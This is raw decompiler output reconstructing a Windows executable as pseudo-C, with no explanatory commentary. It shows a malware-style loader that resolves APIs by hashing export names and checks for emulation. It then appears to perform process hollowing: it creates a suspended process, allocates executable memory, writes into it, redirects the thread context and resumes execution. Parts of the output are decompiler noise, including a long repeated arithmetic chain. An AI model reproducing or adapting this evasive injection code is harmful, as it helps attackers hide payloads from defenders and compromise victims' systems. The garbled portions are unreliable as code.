// subject_UPX0.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register word32 fn00401000(Stack Eq_3 dwArg04, Stack uint32 dwArg08, Register out Eq_3 ecxOut)
// Called from:
//      fn00401592
word32 fn00401000(Eq_3 dwArg04, uint32 dwArg08, HMODULE & ecxOut)
{
	word32 eax_195 = Mem161[Mem17[dwArg04 + 60:word32] + dwArg04 + 0x0078:word32] + dwArg04;
	word16 eax_198[] = dwArg04 + eax_195->dw0024 / 4;
	uint32 esi_19 = dwArg08;
	if (SetFileSecurityA(null, 0x00, null) != 0x00)
		esi_19 = dwArg08 + 420990;
	word32 eax_306[] = dwArg04 + eax_195->dw0020 / 4;
	word32 eax_310[] = dwArg04 + eax_195->dw001C / 4;
	int32 edi_312 = 0x00;
	while (true)
	{
		word32 eax_514;
		if (edi_312 >= eax_195->dw0018)
			break;
		int32 eax_354 = dwArg04 + eax_306[edi_312] / 4;
		byte dwLoc20_554[] = null;
		uint32 dwLoc24_555 = 0x00;
		while (dwLoc20_554[eax_354] != 0x00)
		{
			dwLoc24_555 = (int32) dwLoc20_554[eax_354] ^ 0x1E ^ (dwLoc24_555 << 0x07 | dwLoc24_555 >> 0x19);
			dwLoc20_554 = (byte (*)[]) (dwLoc20_554 + 1);
		}
		if (dwLoc24_555 == esi_19)
		{
			eax_514 = dwArg04 + eax_310[(word32) eax_198[edi_312]] / 4;
			goto l00401589;
		}
		++edi_312;
	}
	eax_514 = 0x00;
l00401589:
	ecxOut = dwArg04;
	return eax_514;
}

// 00401592: void fn00401592()
void fn00401592()
{
	ptr32 fp;
	Eq_3 eax_15 = LoadLibraryW(&g_t405000);
	word32 ecx_1796;
	g_ptr406164 = fn00401000(eax_15, 1244248743, out ecx_1796);
	word32 ecx_1797;
	g_ptr406168 = fn00401000(eax_15, 2527561926, out ecx_1797);
	word32 ecx_1798;
	g_ptr40616C = fn00401000(eax_15, 3181818669, out ecx_1798);
	word32 ecx_1799;
	g_ptr406170 = fn00401000(eax_15, 2785406007, out ecx_1799);
	word32 ecx_1800;
	g_ptr406174 = fn00401000(eax_15, 2785395767, out ecx_1800);
	word32 ecx_1801;
	g_ptr406178 = fn00401000(eax_15, 2255523675, out ecx_1801);
	word32 ecx_1802;
	g_ptr40617C = fn00401000(eax_15, 0x63F500EF, out ecx_1802);
	word32 ecx_1803;
	g_ptr406180 = fn00401000(eax_15, 1751899001, out ecx_1803);
	word32 ecx_1804;
	g_ptr406184 = fn00401000(eax_15, 0x3554B046, out ecx_1804);
	word32 ecx_1805;
	g_ptr406188 = fn00401000(eax_15, 3478798857, out ecx_1805);
	word32 ecx_1806;
	g_ptr40618C = fn00401000(eax_15, 3479045257, out ecx_1806);
	word32 ecx_1807;
	g_ptr406190 = fn00401000(eax_15, 3468381961, out ecx_1807);
	word32 ecx_1808;
	g_ptr406194 = fn00401000(eax_15, 3730767338, out ecx_1808);
	word32 ecx_1809;
	g_ptr406198 = fn00401000(eax_15, 1984633026, out ecx_1809);
	word32 ecx_1810;
	g_ptr40619C = fn00401000(eax_15, 0x7C0B00BF, out ecx_1810);
	word32 ecx_1811;
	g_ptr4061A0 = fn00401000(eax_15, 4110614900, out ecx_1811);
	word32 ecx_1812;
	g_ptr4061A4 = fn00401000(eax_15, 0xF2C4262C, out ecx_1812);
	word32 ecx_935;
	g_ptr4061A8 = fn00401000(eax_15, 0x8FC540B5, out ecx_935);
	struct Eq_223 * esp_950;
	word32 ecx_952;
	g_ptr40618C();
	esp_950->dwFFFFFFFC = g_dw406058;
	esp_950->ptrFFFFFFF8 = fp - 36;
	struct Eq_236 * esp_975;
	word32 ecx_977;
	g_ptr406188();
	esp_975->dwFFFFFFFC = g_dw406024;
	esp_975->ptrFFFFFFF8 = fp - 36;
	struct Eq_249 * esp_1001;
	word32 ecx_1003;
	g_ptr406188();
	esp_1001->dwFFFFFFFC = g_dw406054;
	esp_1001->ptrFFFFFFF8 = fp - 36;
	struct Eq_262 * esp_1040;
	word32 ecx_1042;
	g_ptr406188();
	esp_1040->ptrFFFFFFFC = fp - 36;
	struct Eq_270 * esp_1127;
	Eq_3 eax_1128;
	g_ptr406184();
	esp_1127->dwFFFFFFFC = 2433968327;
	esp_1127->tFFFFFFF8 = eax_1128;
	word32 ecx_1813;
	g_ptr4061AC = fn00401000(esp_1127->tFFFFFFF8, esp_1127->dwFFFFFFFC, out ecx_1813);
	esp_1127->dwFFFFFFFC = 4097904055;
	esp_1127->tFFFFFFF8 = eax_1128;
	word32 ecx_1814;
	g_ptr4061B0 = fn00401000(esp_1127->tFFFFFFF8, esp_1127->dwFFFFFFFC, out ecx_1814);
	esp_1127->dwFFFFFFFC = 3026563454;
	esp_1127->tFFFFFFF8 = eax_1128;
	word32 ecx_1815;
	g_ptr4061B4 = fn00401000(esp_1127->tFFFFFFF8, esp_1127->dwFFFFFFFC, out ecx_1815);
	esp_1127->dwFFFFFFFC = 372843898;
	esp_1127->tFFFFFFF8 = eax_1128;
	word32 ecx_1816;
	g_ptr4061B8 = fn00401000(esp_1127->tFFFFFFF8, esp_1127->dwFFFFFFFC, out ecx_1816);
	esp_1127->dwFFFFFFFC = 4027774739;
	esp_1127->tFFFFFFF8 = eax_1128;
	word32 ecx_1402;
	<anonymous> * eax_1401 = fn00401000(esp_1127->tFFFFFFF8, esp_1127->dwFFFFFFFC, out ecx_1402);
	g_ptr4061BC = eax_1401;
	esp_1127->dwFFFFFFFC = g_dw406004;
	struct Eq_374 * esp_1511;
	Eq_3 eax_1512;
	g_ptr406184();
	esp_1511->dwFFFFFFFC = 2870212857;
	esp_1511->tFFFFFFF8 = eax_1512;
	ui32 ecx_1618;
	<anonymous> * eax_1617 = fn00401000(esp_1511->tFFFFFFF8, esp_1511->dwFFFFFFFC, out ecx_1618);
	g_ptr4061C0 = eax_1617;
	ui32 ecx_1644;
	word32 eax_1728 = fn004033A5((char *) eax_1617 + ecx_1618 + ecx_1618 * 0x02 + ecx_1618 * 0x02 + ecx_1618 * 0x02 + ecx_1618 * 0x02 + ecx_1618 * 0x02 + ecx_1618 * 0x02 + ecx_1618 * 0x02, ecx_1618, out ecx_1644) + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02 + ecx_1644 * 0x02;
	esp_1511->dwFFFFFFFC = 0x00;
	g_ptr406180();
}

// 004033A5: Register word32 fn004033A5(Register word32 eax, Register ui32 ecx, Register out ptr32 ecxOut)
// Called from:
//      fn00401592
word32 fn004033A5(word32 eax, ui32 ecx, ptr32 & ecxOut)
{
	ptr32 fp;
	struct Eq_551 * esp_140;
	word32 eax_141;
	word32 ecx_142;
	g_ptr40618C();
	esp_140->dwFFFFFFFC = g_dw406050;
	esp_140->dwFFFFFFF8 = 4221132;
	struct Eq_564 * esp_242;
	word32 eax_243;
	word32 ecx_244;
	g_ptr406188();
	esp_242->dwFFFFFFFC = g_dw406010;
	esp_242->dwFFFFFFF8 = 4221132;
	struct Eq_577 * esp_269;
	word32 eax_270;
	word32 ecx_271;
	g_ptr406188();
	esp_269->dwFFFFFFFC = g_dw406030;
	esp_269->dwFFFFFFF8 = 4221132;
	struct Eq_590 * esp_303;
	word32 eax_304;
	word32 ecx_305;
	g_ptr406188();
	esp_303->dwFFFFFFFC = 4220872;
	esp_303->dwFFFFFFF8 = 4221132;
	struct Eq_602 * esp_411;
	word32 eax_412;
	word32 ecx_413;
	g_ptr406188();
	g_dw4069D0 = 0x44;
	g_dw4069FC = 0x01;
	g_w406A00 = 0x02;
	esp_411->dwFFFFFFFC = 0x00406A14;
	esp_411->dwFFFFFFF8 = 0x004069D0;
	esp_411->dwFFFFFFF4 = 0x00;
	esp_411->dwFFFFFFF0 = 0x00;
	esp_411->dwFFFFFFEC = 0x04;
	esp_411->dwFFFFFFE8 = 0x00;
	esp_411->dwFFFFFFE4 = 0x00;
	esp_411->dwFFFFFFE0 = 0x00;
	esp_411->dwFFFFFFDC = 4221132;
	esp_411->dwFFFFFFD8 = 0x00;
	struct Eq_655 * esp_635;
	word32 ecx_637;
	g_ptr406164();
	esp_635->tFFFFFFFC = null;
	Eq_3 eax_689 = GetModuleHandleA(esp_635->tFFFFFFFC);
	word32 eax_848 = Mem688[eax_689 + 60:word32] + eax_689;
	esp_635->tFFFFFFFC = (CHAR *) 0x40;
	esp_635->dwFFFFFFF8 = 0x3000;
	esp_635->dwFFFFFFF4 = eax_848->dw0050;
	esp_635->tFFFFFFF0 = eax_689;
	esp_635->dwFFFFFFEC = g_dw406A14;
	struct Eq_697 * esp_875;
	word32 eax_876;
	word32 ecx_877;
	g_ptr406168();
	esp_875->ptrFFFFFFFC = fp - 8;
	esp_875->dwFFFFFFF8 = eax_848->dw0050;
	esp_875->tFFFFFFF4 = eax_689;
	esp_875->dwFFFFFFF0 = eax_876;
	esp_875->dwFFFFFFEC = g_dw406A14;
	struct Eq_722 * esp_1072;
	word32 eax_1073;
	word32 ecx_1074;
	g_ptr40616C();
	g_dw406A24 = 0x00010007;
	esp_1072->dwFFFFFFFC = 0x00406A24;
	esp_1072->dwFFFFFFF8 = g_dw406A18;
	struct Eq_738 * esp_1175;
	word32 ecx_1177;
	g_ptr406170();
	g_dw406ADC = 4204243;
	esp_1175->dwFFFFFFFC = 0x00406A24;
	esp_1175->dwFFFFFFF8 = g_dw406A18;
	struct Eq_752 * esp_1305;
	word32 eax_1306;
	word32 ecx_1307;
	g_ptr406174();
	esp_1305->dwFFFFFFFC = g_dw406A18;
	word32 eax_1348;
	ptr32 ecx_1349;
	g_ptr406178();
	ecxOut = ecx_1349;
	return eax_1348;
}

WCHAR g_t405000 = 'k'; // 00405000
uint32 g_dw406004 = 0x00405102; // 00406004
word32 g_dw406010 = 0x004050F3; // 00406010
word32 g_dw406024 = 0x0040505E; // 00406024
word32 g_dw406030 = 0x00405052; // 00406030
word32 g_dw406050 = 0x00405021; // 00406050
word32 g_dw406054 = 0x0040501D; // 00406054
word32 g_dw406058 = 0x0040501A; // 00406058
<anonymous> * g_ptr406164 = null; // 00406164
<anonymous> * g_ptr406168 = null; // 00406168
<anonymous> * g_ptr40616C = null; // 0040616C
<anonymous> * g_ptr406170 = null; // 00406170
<anonymous> * g_ptr406174 = null; // 00406174
<anonymous> * g_ptr406178 = null; // 00406178
<anonymous> * g_ptr40617C = null; // 0040617C
<anonymous> * g_ptr406180 = null; // 00406180
<anonymous> * g_ptr406184 = null; // 00406184
<anonymous> * g_ptr406188 = null; // 00406188
<anonymous> * g_ptr40618C = null; // 0040618C
<anonymous> * g_ptr406190 = null; // 00406190
<anonymous> * g_ptr406194 = null; // 00406194
<anonymous> * g_ptr406198 = null; // 00406198
<anonymous> * g_ptr40619C = null; // 0040619C
<anonymous> * g_ptr4061A0 = null; // 004061A0
<anonymous> * g_ptr4061A4 = null; // 004061A4
<anonymous> * g_ptr4061A8 = null; // 004061A8
<anonymous> * g_ptr4061AC = null; // 004061AC
<anonymous> * g_ptr4061B0 = null; // 004061B0
<anonymous> * g_ptr4061B4 = null; // 004061B4
<anonymous> * g_ptr4061B8 = null; // 004061B8
<anonymous> * g_ptr4061BC = null; // 004061BC
<anonymous> * g_ptr4061C0 = null; // 004061C0
word32 g_dw4069D0 = 0x00; // 004069D0
word32 g_dw4069FC = 0x00; // 004069FC
word16 g_w406A00 = 0x00; // 00406A00
word32 g_dw406A14 = 0x00; // 00406A14
word32 g_dw406A18 = 0x00; // 00406A18
word32 g_dw406A24 = 0x00; // 00406A24
word32 g_dw406ADC = 0x00; // 00406ADC
